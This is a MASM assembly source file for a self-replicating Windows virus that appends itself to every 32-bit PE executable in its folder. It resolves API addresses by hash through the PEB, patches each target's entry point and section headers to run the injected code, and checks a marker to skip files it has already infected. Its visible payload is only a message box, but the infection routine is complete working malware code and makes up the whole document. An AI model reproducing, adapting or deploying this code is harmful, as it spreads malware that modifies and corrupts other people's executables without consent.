;
; Program is written by MASM 32bit assembly
; When it run, it will copy itself to PE 32bit file in same folder
;  ____________________________________
; |         Note begin offset          |
; |------------------------------------|
; |                                    |
; |        Get function address        |
; |                                    |
; |------------------------------------|
; |           MalwareCode              |
; |                                    |
; |------------------------------------|
; |                                    |
; |         InjectCode2PEFile          |
; |                                    |
; |------------------------------------|
; |        Function and procedure      |
; |                                    |
; |------------------------------------|
; |               Data                 |
; |____________________________________|
;

.386
.model flat, stdcall

option casemap:none

.code
main:
incode segment
start_index:
    ;--------------------------------------------------------------
    ; Note begin offset
    ;--------------------------------------------------------------

    ; ebp is stored Delta offset ()
        call    Delta
    Delta:
        pop     ebp
        sub     ebp, offset Delta

    ;--------------------------------------------------------------
    ;   Get Function Address
    ;--------------------------------------------------------------

    Get_Function_Address:
    ; PEB assembly
    ; return: eax <- kernel32.dll base address
        ASSUME FS:NOTHING
        mov     eax, fs:[30h]  ; Store the address of the PEB in eax
        mov     eax, [eax + 0ch]   ; Extract the pointer to the LoaderData structure in PEB 
        mov     esi, [eax + 1ch]   ; Extract the first entry in the InInitializationOrderModuleList
        lodsd
        mov     eax, [eax]  ; eax points to kernel32.dll (3rd in list)
        mov     eax, [eax + 8h]    ; kernel32.dll base address is stored in eax

    ; find Function in kernel32.dll
        push    0dh
        push    eax
        lea     eax, [ebp + offset kernel32FunctionsAddress]
        push    eax
        lea     eax, [ebp + offset kernel32FunctionsHash]
        push    eax
        call    findAPI

    ; get user32.dll base address
        lea     eax, [ebp + offset strUser32dll]
        push    eax
        call    [ebp + offset _LoadLibrary]    ; eax <- user32.dll base address

    ; find Function in user32.dll (MessageBoxA)
        push    01h
        push    eax
        lea     eax, [ebp + offset user32FunctionsAddress]
        push    eax
        lea     eax, [ebp + offset user32FunctionsHash]
        push    eax
        call    findAPI

    ;--------------------------------------------------------------
    ;   Malware Code Script
    ;--------------------------------------------------------------

        push    0
        lea     eax, [ebp + offset strTitle]
        push    eax
        lea     eax, [ebp + offset strContent]
        push    eax
        push    0
        call    [ebp + offset _MessageBoxA]

    ;--------------------------------------------------------------
    ;   Inject Code to PE file
    ;--------------------------------------------------------------

    ; Find a file to infect
    
    ; Get First PE File
        lea     eax, [ebp + offset pathFile]
        push    eax
        push    100
        call    [ebp + offset _GetCurrentDirectoryA]    ; DWORD GetCurrentDirectory( DWORD nBufferLength, LPTSTR lpBuffer)   

        lea     eax, [ebp + offset pathExten]
        push    eax
        lea     eax, [ebp + offset pathFile]
        push    eax
        call    [ebp + offset _lstrcatA]    ;   LPSTR lstrcatA( LPSTR lpString1, LPSTR lpString2) // create path file search PE file

        lea     eax, [ebp + offset findFileData]
        push    eax
        lea     eax, [ebp + offset pathFile]
        push    eax    
        call    [ebp + offset _FindFirstFileA] ; HANDLE FindFirstFileA( LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)

        mov     [ebp + offset _handleSearchFile], eax   ; store search handle into handleFile
        jmp     Check_File

    Find_Next_PE_File:
        lea     eax, [ebp + offset findFileData]
        push    eax
        push    [ebp + offset _handleSearchFile]
        call    [ebp + _FindNextFileA]  ; BOOL FindNextFileA( HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
        test    eax, eax
        je      End_Script_Virus

    Check_File:
        lea     eax, [ebp + offset _handleSearchFile]
        cmp     eax, 0FFFFFFFFh ; check return value is INVALID_HANDLE_VALUE
        je      End_Script_Virus

        mov     eax, [ebp + offset findFileData]
        cmp     eax, 10h
        je      Find_Next_PE_File 

    ; Get file path
        ; Get current directory
        lea     eax, [ebp + offset path]
        push    eax
        push    100
        call    [ebp + _GetCurrentDirectoryA]

        ; concatenate folder path + "\"
        lea     eax, [ebp + offset backSlack]
        push    eax
        lea     eax, [ebp + offset path]
        push    eax
        call    [ebp + offset _lstrcatA]

        ; concatenate directory path + name file
        lea     eax, [ebp + offset findFileData + 44]   ; cFileName in LPWIN32_FIND_DATAA
        push    eax
        lea     eax, [ebp + offset path]
        push    eax
        call    [ebp + offset _lstrcatA]

        push    0   ; NULL
        push    20h ; FILE_ATTRIBUTE_NORMAL
        push    3h  ; OPEN_EXISTING
        push    0   ; NULL
        push    1h  ; FILE_SHARE_READ
        push    0C0000000h  ; GENERIC_READ | GENERIC_WRITE
        lea     eax, [ebp + offset path]
        push    eax 
        call    [ebp + offset _CreateFileA] ; HANDLE CreateFileA( LPCSTR lpFileName, DWORD dwDesireAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
        cmp     eax, 0FFFFFFFFh
        je      Find_Next_PE_File

        mov     [ebp + offset _handleFile], eax

    ; Check PE file sign
        ; Read 'MZ' sign
        push    0   ; NULL
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    2
        lea     eax, [ebp + offset dwValue]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + _ReadFile]   ; BOOL ReadFile( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)

        ; Compare dwValue with 'MZ'
        cmp     [ebp + dwValue], 5A4Dh
        jne      Close_Handle_File

        ; Read 'PE' sign
        ; Move the poiter to 3c and read value ( offset to PE signature)
        push    0h   ; FILE_BEGIN
        push    0   ; NULL
        push    3ch
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]  ; DWORD SetFilePoiter( HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)

        ; Stored PE signature address into _PEsignature
        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset _PEsignature]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + _ReadFile]

        ; Move the poiter to PE signature and read value in this offset
        push    0h
        push    0 
        push    [ebp + offset _PEsignature]
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset ddValue] 
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + _ReadFile]

        ; Compare ddValue with 'PE\0\0'
        cmp     [ebp + offset ddValue], 00004550h
        jne      Close_Handle_File

        ; Move poiter to magic in Optional Header
        push    1h  ; FILE_CURRENT
        push    0
        push    14h
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        ; Read value magic in Optional Header
        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    2
        lea     eax, [ebp + offset dwValue]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Compare dwValue with PE32 sign (010Bh)
        mov     eax, [ebp + offset dwValue]
        and     eax,0FFFFh
        cmp     eax, 010Bh
        jne     Close_Handle_File

    ; Get value
        ; Get value of NumberOfSections
        push    0h
        push    0
        mov     eax, [ebp + offset _PEsignature]
        add     eax, 6  ; offset NumberOfSections - offset PE Signature == 6
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    2
        lea     eax, [ebp + offset numberOfSections]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Get value of AddressOfEntryPoint
        push    1h 
        push    0
        push    20h ; offset AddressOfEntryPoint - poiter (offset NumberOfSections) == 22h
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset addressOfEntryPoint]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Get value of ImageBase
        push    1h 
        push    0
        push    8h ; offset ImageBase - poiter (offset AddressOfEntryPoit) = 0ch
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset imageBase]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Get value of SectionAlignment
        push    1h 
        push    0
        push    0
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset sectionAlignment]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Get value of FileAlignment
        push    1h 
        push    0
        push    0
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset fileAlignment]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Get address to last Section
        xor     eax, eax    ; eax = 0
        mov     ecx, [ebp + offset numberOfSections]
        and     ecx,0FFFFh
        dec     ecx
    Loop_Calculate_Last_Section:
        jecxz   End_Loop_calculate_Last_Section
        add     eax, 28h    ; Sizeof( SECTION_HEADER) == 28h
        dec     ecx
        jmp     Loop_Calculate_Last_Section
    End_Loop_calculate_Last_Section:
        add     eax, 0f8h   ; first section address - PE signature address 
        add     eax, [ebp + offset _PEsignature]
        mov     [ebp + offset _lastSection], eax

        ; Get value of VirtualSize
        push    0h
        push    0
        mov     eax, [ebp + offset _lastSection]
        add     eax, 8
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset virtualSize]
        push    eax
        push    [ebp + _handleFile]
        call    [ebp + _ReadFile]

        ; Get value of VirtualAddress
        push    1h
        push    0
        push    0
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset virtualAddress]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Get value of SizeOfRawData
        push    1h
        push    0
        push    0
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset sizeOfRawData]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Get value of PoiterToRawData
        push    1h
        push    0
        push    0
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset pointerToRawData]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        ; Calculate size of virus
        mov     eax, offset end_index
        sub     eax, offset start_index
        mov     [ebp + offset sizeOfVirus], eax

    ; Is this file already infected? If address of offset kernel32FunctionsHash in last section is 7c0dfcaah then this file is infected.
        mov     eax, offset end_index
        sub     eax, offset kernel32FunctionsHash
        
        mov     ebx, [ebp + offset pointerToRawData]
        add     ebx, [ebp + offset virtualSize]   ; Size of this file
        sub     ebx, eax    ; Relative position offset kernel32FunctionsHash this file

        ; Read dd in relative position
        push    0h
        push    0
        push    ebx
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset ddValue]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + _ReadFile]

        ; Compare this dd value with 7c0dfcaah
        cmp     [ebp + offset ddValue], 7c0dfcaah
        je     Close_Handle_File

    ; Inject the file
        mov     eax, [ebp + offset pointerToRawData]
        add     eax, [ebp + offset sizeOfRawData]   ; calculate last address of file, so to inject virus into this
        push    0h
        push    0
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    [ebp + offset sizeOfVirus]
        lea     eax, [ebp + offset start_index]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _WriteFile]

        ; Change End_Script_Virus to jump original entry point
        mov     ebx, [ebp + offset pointerToRawData]    ; move pointer to last section data
        add     ebx, [ebp + offset sizeOfRawData]   ; move pointer to end of section
        mov     eax, offset End_Script_Virus
        sub     eax, offset start_index
        add     ebx, eax    ; move pointer to position of End_Script_Virus

       ; add     ebx, 2      ; move pontert to [ebp + offset Exit_Process] in "lea eax, [ebp + offset Exit_Process]"

        push    0h
        push    0
        push    ebx
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]  ; move pointer to End_Script_Virus

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    2
        lea     eax, [ebp + offset strInMOV]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _WriteFile]   ; change lea (op: 8D 85) to NOP MOV (op: 90 B8)

        mov     ebx, [ebp + offset addressOfEntryPoint]
        add     ebx, [ebp + offset imageBase]
        mov     [ebp + offset addressOfEntryPoint], ebx

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset addressOfEntryPoint]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _WriteFile]

    ; Change information in PE File format
        ; Change AddressOfEntryPoint
        mov     edx, [ebp + offset virtualAddress]
        add     edx, [ebp + offset sizeOfRawData]   ; address of new entry point

        mov     [ebp + offset newEntryPoint], edx

        mov     ebx, [ebp + offset _PEsignature]
        add     ebx, 28h    ; this position AddressOfEntryPoint

        push    0h
        push    0
        push    ebx
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset newEntryPoint]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _WriteFile]

        ; Change VirtualSize
        mov     edx, [ebp + offset sizeOfRawData]
        add     edx, [ebp + sizeOfVirus]    ; new virtual size

        mov     [ebp + offset virtualSize], edx

        mov     ebx, [ebp + offset _lastSection]
        add     ebx, 8  ; position of virtual size

        push    0h
        push    0
        push    ebx
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     eax, [ebp + offset NOBR]
        push    eax
        push    4
        lea     eax, [ebp + offset virtualSize]                                     ; Fix bug is here! Done, You continue :))
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _WriteFile]

        ; Change SizeOfRawData
        ;push    [ebp + offset sizeOfRawData]
        ;push    [ebp + offset virtualSize]
        ;push    [ebp + offset fileAlignment]
        ;call    calculate_Multiple   ; eax <- new SizeOfRawData

        ;mov     [ebp + offset sizeOfRawData], eax
        mov      eax, [ebp + offset sizeOfVirus]
        add     [ebp + offset sizeOfRawData], eax

        push    1h
        push    0
        push    4
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     ebx, [ebp + offset NOBR]
        push    ebx
        push    4
        lea     eax, [ebp + offset sizeOfRawData]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _WriteFile]

        ; Change Characteristics
        push    1h
        push    0
        push    10h
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     ebx, [ebp + offset NOBR]
        push    ebx
        push    4
        lea     eax, [ebp + offset characteristics]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _WriteFile]

        ; Change SizeOfImage
        mov     eax, [ebp + offset _PEsignature]
        add     eax, 50h

        push    0h
        push    0
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]  ; move poiter to SizeOfImage

        push    0
        lea     ebx, [ebp + offset NOBR]
        push    ebx
        push    4
        lea     eax, [ebp + offset sizeOfImage]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _ReadFile]

        mov     eax, [ebp + offset sizeOfVirus]
        add     [ebp + offset sizeOfImage], eax
        ;lea     eax, [ebp + offset sizeOfVirus]
        ;add     eax, [ebp + offset sizeOfImage]
        ;mov     [ebp + offset sizeOfVirus], eax ; changed

        ;push    [ebp + offset sizeOfImage]
        ;push    [ebp + offset sizeOfVirus]
        ;push    [ebp + offset sectionAlignment]
        ;call    calculate_Multiple  ; eax <- new value SizeOfImage

        ;mov     [ebp + sizeOfImage], eax

        mov     eax, [ebp + offset _PEsignature]
        add     eax, 50h

        push    0h
        push    0
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _SetFilePointer]

        push    0
        lea     ebx, [ebp + offset NOBR]
        push    ebx
        push    4
        lea     eax, [ebp + offset sizeOfImage]
        push    eax
        push    [ebp + offset _handleFile]
        call    [ebp + offset _WriteFile]

    Close_Handle_File:
        push    [ebp + offset _handleFile]
        call    [ebp + offset _CloseHandle]
        jmp     Find_Next_PE_File

    End_Script_Virus:
        lea     eax, [ebp + offset Exit_Process]
        jmp     eax
    
    ; Exit Process Virus
    Exit_Process:
        push    0
        lea     eax, [ebp + offset strDone]
        push    eax
        lea     eax, [ebp + offset strDone]
        push    eax
        push    0
        call    [ebp + offset _MessageBoxA]

        push    0
        call    [ebp + offset _ExitProcess]

    ;--------------------------------------------------------------
    ;   Function and procedure
    ;--------------------------------------------------------------

    ; calculate value is multiple of input
    ; IN:   InputValue
    ;       CompareValue
    ;       Base
    ; Out:  Return to eax
    ;calculate_Multiple:
    ;    pushad
    ;    mov     eax, [esp + 2ch]    ; eax <- InputValue
    ;    mov     ecx, [esp + 28h]    ; ecx <- CompareValue
    ;    mov     ebx, [esp + 24h]    ; ebx <- Base

    ;    Loop_Calculate_Multiple:
    ;    cmp     eax, ecx
    ;    jg      End_Loop_Calculate_Multiple
    ;    add     eax, ebx
    ;    jmp     Loop_Calculate_Multiple

    ;    End_Loop_Calculate_Multiple:
    ;    mov     [esp + 1ch], eax    ; write to eax
    ;    popad
    ;    ret

    ; write the API address values to offset kernel32FunctionAddress
    ; IN:   number of FunctionHash
    ;       bae address
    ;       offset FunctionAddress
    ;       offset FunctionHash
    ; OUT:  FunctionAddress is filled
    findAPI:
        pushad
        mov     edx, [esp]  ; save point to come back main function
        mov     ecx, [esp + 30h]   ; ecx <- number of FunctionHash
        mov     ebx, [esp + 2ch]   ; ebx <- base address
        mov     eax, [esp + 28h]   ; edi <- FunctionAddress
        lea     edi, [eax]
        mov     eax, [esp + 24h]   ; esi <- FunctionHash
        lea     esi, [eax]

    loop_findAPI:
        ; loop to find function
        jecxz   end_findAPI ; end if ecx == 0
        push    [esi]
        push    ebx
        call    find_function
        mov     [edi], eax

        ; move to next function
        add     edi, 4
        add     esi, 4
        add     esp, 8  ; return value in top esp

        ; count--
        dec     ecx
        jmp     loop_findAPI

    end_findAPI:
        popad
        ret

    ;------------------------------------------------------------------------------------------------------------

    ; find function in module
    ; IN: the function request hash [esp + 0x28]
    ;     the base address of module [esp + 0x24]
    ; OUT:the function's address ( in eax)
    find_function:
        pushad
        mov     ebp, [esp + 24h]   ; Store the base address in ebp
        mov     eax, [ebp + 3ch]   ; Skip over the MSDOS header to start of the PE header
        mov     edx, [ebp + eax + 78h] ; the export table is 0x78 bytes from the start of PE header. Extract it and start the relative address in edx
        add     edx, ebp    ; edx <- the export table address absilute
        mov     ecx, [edx + 18h]   ; ecx <- number of exported items and ecx will be used as the counter
        mov     ebx, [edx + 20h]   ; Extract the names table relative offset and store it in ebx
        add     ebx, ebp    ; ebx <- the names table relative offset
    find_function_loop:
        jecxz   find_function_finished  ; if (ecx == 0) jump find_function_finished, check the last symbol
        dec     ecx
        mov     esi, [ebx + ecx * 4]    ; esi <- The relative offset of the name
        add     esi, ebp    ; esi <- the address of the symbol name
    compute_hash:
        xor     edi, edi
        xor     eax, eax
        cld     ; clear the direction flag
    compute_hash_again:
        lodsb   ; load byte at address esi into al
        test    al, al
        jz      compute_hash_finished   
        ror     edi, 0dh
        add     edi, eax
        jmp     compute_hash_again
    compute_hash_finished:
    find_function_compare:
        cmp     edi, [esp + 28h]   ; check to see if the computed hash matches the requested hash
        jnz     find_function_loop  ; if the hashes do not match
        mov     ebx, [edx + 24h]    ; ebx <- the ordinals table relative offset
        add     ebx, ebp    ; ebx <- the ordinals table address
        mov     cx, [ebx + 2 * ecx] ; Extract the current symbols ordinal number from the ordinal table
        mov     ebx, [edx + 1ch]   ; ebx <- the address table relative offset
        add     ebx, ebp    ; ebx <- the address table adress
        mov     eax, [ebx + 4 * ecx]    ;   Extract the relative function offset and store it in eax
        add     eax, ebp    ; eax <- the function's address
        mov     [esp + 1ch], eax   ; Overwrite the stack copy of the preserved eax register
    find_function_finished:
        popad
        ret

    ;--------------------------------------------------------------
    ;   Data
    ;--------------------------------------------------------------

        strUser32dll            db  "user32.dll",0

        strContent              db  "Hi, I'm here!",0
        strTitle                db  "Hi",0
        strDone                 db  "Done!",0
        strInMOV                dw  0b890h

    kernel32FunctionsAddress:
        _GetProcAddress         dd      ?
        _LoadLibrary            dd      ?
        _ExitProcess            dd      ?
        _CloseHandle            dd      ?
        _CreateFileA            dd      ?
        _FindClose              dd      ?
        _FindFirstFileA         dd      ?
        _FindNextFileA          dd      ?
        _GetCurrentDirectoryA   dd      ?
        _ReadFile               dd      ?
        _SetFilePointer         dd      ?
        _WriteFile              dd      ?
        _lstrcatA               dd      ?
        _VirtualProtect         dd      ?

    kernel32FunctionsHash:
        hGetProcAddress         dd      7c0dfcaah
        hLoadLibrary            dd      0ec0e4e8eh
        hExitProcess            dd      73e2d87eh
        hCloseHandle            dd      0ffd97fbh
        hCreateFileA            dd      7c0017a5h
        hFindClose              dd      23545978h
        hFindFirstFileA         dd      63d6c065h
        hFindNextFileA          dd      0a5e1ac97h
        hGetCurrentDirectoryA   dd      0bfc6eb4fh
        hReadFile               dd      10fa6516h
        hSetFilePointer         dd      76da08ach
        hWriteFile              dd      0e80a791fh
        hlstrcatA               dd      0cb73463bh

    user32FunctionsAddress:
        _MessageBoxA            dd ?

    user32FunctionsHash:
        hMessageBoxA            dd      0bc4da2a8h

        backSlack               db      "\",0
        pathFile                db      100 dup(?)
        findFileData            db      320 dup(?)
        _handleSearchFile        dd      ?
        pathExten               db      "\*.exe",0
        path                    db      100 dup(?)
        _handleFile              dd      ?
        NOBR                    dd      ?
        dwValue                 dw      ?

        ddValue                 dd      ?

        _PEsignature            dd      ?
        numberOfSections        dw      ?
        addressOfEntryPoint     dd      ?
        imageBase               dd      ?
        sectionAlignment        dd      ?
        fileAlignment           dd      ?

        _lastSection            dd      ?
        virtualAddress          dd      ?
        virtualSize             dd      ?
        sizeOfRawData           dd      ?
        pointerToRawData        dd      ?

        sizeOfVirus             dd      ?
        newEntryPoint           dd      ?
        characteristics         dd      0E0000060h
        sizeOfImage             dd      ?

end_index:
incode ends

end main